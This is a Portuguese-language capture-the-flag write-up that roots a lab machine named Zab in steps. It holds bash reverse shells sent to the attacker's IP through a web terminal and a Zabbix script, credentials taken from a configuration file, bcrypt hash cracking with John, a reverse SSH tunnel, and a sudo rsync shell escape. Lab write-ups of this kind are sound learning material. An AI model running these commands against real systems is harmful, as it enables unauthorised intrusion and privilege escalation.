A Zab já me entregou um terminal web logo de cara. Só que dali até root ainda teve chão: configuração do MySQL, hashes para quebrar, túnel SSH e um script no Zabbix que me colocou em outro usuário. O último passo veio no sudo do rsync. Teve até senha que eu achei que era do guest e acabou funcionando no Admin. Bora organizar esse caminho.

1 · Reconhecimento

Começo com uma varredura de todas as portas TCP. O alvo da minha sessão era 192.168.234.210. Uso -p- para cobrir as 65.535 portas e -Pn para pular a descoberta prévia do host.

sudo nmap -p- --min-rate 5000 -Pn 192.168.234.210

Depois volto nessas três portas para identificar serviços e executar os scripts padrão. A taxa mínima de 5000 da primeira varredura acelera a busca, mas depende da rede responder bem. Não confundo essa triagem com a confirmação dos serviços.

sudo nmap -sC -sV -Pn -p22,80,6789 192.168.234.210
PortaServiçoIdentificação na captura
22/tcpSSHOpenSSH 8.9p1 Ubuntu
80/tcpHTTPApache 2.4.52 / Ubuntu default page
6789/tcpHTTPTornado 6.3.3 / Mage

A checagem UDP não trouxe portas abertas nas minhas anotações. Sigo pelos serviços TCP. As versões da tabela são as que aparecem na captura da Zab.

2 · Terminal web e primeira shell

A porta 80 mostra a página padrão do Apache. Na 6789, encontro a interface do Mage. Começo por ela.

http://192.168.234.210:6789/overview?tab=today

Uma das opções é um terminal. Abro e testo whoami e id: os comandos já executam como www-data. Não precisei de uma CVE nessa etapa; usei o terminal que estava disponível na aplicação.

whoami
id

No Kali, deixo o listener esperando na porta 4444. O IP da minha VPN nesta sessão era 192.168.45.202.

sudo nc -nlvp 4444

No terminal da aplicação, executo a reverse shell apontando para esse listener:

/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.202/4444 0>&1'

Recebo a conexão e confirmo o usuário. Também encontro local.txt no diretório em que a shell abriu. Primeira flag na mão.

whoami
id
ls
cat local.txt
ip a
hostname

Antes de continuar, melhoro a interação com a shell. No alvo, abro uma pseudo-terminal com Python:

python3 -c 'import pty; pty.spawn("/bin/bash")'

Pressiono Ctrl+Z para suspender o Netcat e voltar ao terminal do Kali. No Kali, executo a linha abaixo e retorno à sessão:

stty raw -echo; fg

De volta ao alvo, ajusto o tipo de terminal:

export TERM=xterm

Aqui estou estabilizando a sessão, não criando persistência. A conexão ainda depende da shell e do listener continuarem ativos. Esse ajuste ajudou nas próximas etapas interativas.

3 · Serviços locais e configuração do Zabbix

Com a shell, verifico as portas em escuta no próprio alvo. O comando não descobre redes internas: ele mostra sockets locais, endereços de escuta e, quando disponível para meu usuário, o processo associado.

ss -lnpt

A 3306 lembra MySQL. As 10050 e 10051 me levam a pesquisar Zabbix: são portas normalmente usadas pelo agente e pelo servidor, respectivamente. Na captura, esses listeners estão no loopback.

Procuro a configuração e encontro /etc/zabbix. Nem tudo é legível pelo www-data: a tentativa de ler zabbix_server.conf retorna permissão negada. A pasta web, porém, tem um arquivo que consigo abrir.

ls -la /etc/zabbix
cat /etc/zabbix/web/zabbix.conf.php

O arquivo mostra banco e usuário zabbix, servidor local e a senha breadandbuttereater121. Guardo essa credencial para o MySQL. Ela ainda não é uma senha confirmada de login no painel.

4 · Acesso ao MySQL e tabela de usuários

Na shell da Zab, conecto ao MySQL local. Deixo o -p sem a senha na linha de comando e informo o valor quando o cliente pede.

mysql -h 127.0.0.1 -u zabbix -p

Dentro do cliente MySQL, listo os bancos, seleciono zabbix e procuro as tabelas:

SHOW DATABASES;
USE zabbix;
SHOW TABLES;
SELECT * FROM users;

Encontro as contas Admin e guest, com valores começando por $2y$10$. São hashes bcrypt, não senhas codificadas em Base64. O próximo passo é testar candidatos de senha offline.

5 · John e a senha do Admin

Coloco os hashes em um arquivo e uso o John. Tava tendo problema com o Hashcat, aquele clássico de placa de vídeo. Para facilitar a associação entre conta e resultado, deixei os hashes identificados no bloco abaixo.

Admin:$2y$10$KA6iPN5sY5.Z4KLerN7XOOO1P7jR8MD2e0SqNRXOsJjV1b.8c5Si.
guest:$2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06

Salvo o conteúdo em hashes.txt no Kali e faço o teste com a wordlist:

john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show --format=bcrypt hashes.txt

Aparece dinosaur. Primeiro achei que era a senha do guest. Depois, no painel, confirmei que o acesso que funcionava era Admin:dinosaur. Melhor! Mas fica o detalhe: uma senha aparecer na saída não dispensa conferir a qual conta ela pertence.

6 · Túnel SSH e acesso ao painel

Para acessar o frontend do Zabbix pelo Kali, monto um encaminhamento reverso de porta. O comando abaixo roda na shell da Zab e conecta ao SSH do meu Kali, em 192.168.45.202. Ele precisa conseguir autenticar com a conta kali.

ssh -fN -R 127.0.0.1:8080:127.0.0.1:80 kali@192.168.45.202
ParteOnde ficaPapel
127.0.0.1:8080KaliPorta aberta pelo encaminhamento, acessada pelo navegador.
127.0.0.1:80ZabDestino HTTP alcançado do lado do alvo.
kali@192.168.45.202Servidor SSH no KaliConexão que transporta o tráfego entre os dois lados.

O -R cria o listener no lado remoto da conexão SSH, que aqui é o Kali. O -N não executa um comando remoto e o -f coloca o cliente em background após a autenticação. Os dois 127.0.0.1 são vistos de máquinas diferentes: o primeiro é do Kali, o segundo é da Zab.

No navegador do Kali, abro:

http://127.0.0.1:8080/zabbix/

Agora uso Admin:dinosaur e consigo entrar. O painel mostra Zabbix 7.2.4.

As portas 10050 e 10051 são da comunicação do Zabbix, não do frontend HTTP. O túnel desta etapa leva à porta 80 e ao caminho /zabbix/. É esse endereço que abro no navegador.

7 · Script no Zabbix e nova shell

Em Alerts → Scripts, encontro a opção de executar comandos. Esse passa a ser meu caminho para obter uma sessão no contexto do serviço Zabbix.

Deixo outro listener no Kali, agora na porta 443:

sudo nc -nlvp 443

Crio um script chamado ROOT, com escopo Manual host action, tipo Script e execução no Zabbix proxy or server. Esse nome foi só o rótulo que escolhi; ele não define o usuário do sistema.

A captura mostra um comando diferente do que acabou funcionando. O que usei com sucesso no campo Commands foi este, chamando o Bash explicitamente com -c:

/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.202/443 0>&1'

Salvo o script e vou até Monitoring → Hosts. No menu do host Zabbix server, seleciono ROOT na lista de scripts.

A conexão chega, mas ainda não sou root. O whoami retorna zabbix. Essa confirmação é o que vale, independentemente do nome que dei ao script.

whoami
id
hostname

8 · Sudo, rsync e root

Com o novo usuário, verifico novamente o sudo -l. Agora aparece uma permissão bem interessante: /usr/bin/rsync pode rodar via sudo sem senha.

sudo -l

Consulto a referência do rsync no GTFOBins. A opção -e permite escolher o comando usado como shell de transporte. Com o rsync autorizado no sudo, esse caminho pode abrir uma shell privilegiada.

Executo na sessão do usuário zabbix:

sudo rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x

O x:x aciona o formato de transferência remota; o comando definido em -e é usado para abrir a shell. Não foi necessário obter uma senha de root. Confiro a identidade e leio a prova:

whoami
hostname
ip a
cat /root/proof.txt

BOOOM! Agora sim, root na Zab. Pwn3d!

9 · O que levo dessa máquina

A Zab seguiu por terminal do Mage → www-data → configuração do banco → hashes → Admin no Zabbix → usuário zabbix → sudo no rsync → root. O acesso inicial estava bem na frente, mas o restante exigiu entender cada contexto e conectar as pistas.

  • Melhorar a sessão: estabilizar a shell ajudou a trabalhar com os serviços seguintes.
  • Separar as credenciais: usuário do banco, Admin do painel e usuário Linux zabbix não são a mesma conta.
  • Entender o túnel: saber onde cada ponta escuta evita testar o endereço errado.
  • Repetir a enumeração após mudar de usuário: a permissão que levou ao root apareceu na sessão do zabbix.

Referências: manual do OpenSSH, scripts no Zabbix 7.2 e rsync no GTFOBins.
